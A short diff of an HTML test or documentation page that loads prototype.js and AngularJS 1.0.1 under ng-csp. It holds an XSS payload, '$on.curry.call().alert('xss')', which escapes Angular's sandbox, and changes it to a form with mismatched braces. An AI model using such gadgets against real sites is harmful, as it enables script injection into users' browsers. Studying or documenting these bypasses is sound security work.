@@ -234,7 +234,7 @@ node -e 'require("fs").copyFileSync("link_file", "test.txt")'
     <script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
     <div ng-app ng-csp>
-      {{$on.curry.call().alert('xss')}}
+      { $on.curry.call().alert('xss') }}
     </div>
   </body>
 </html>
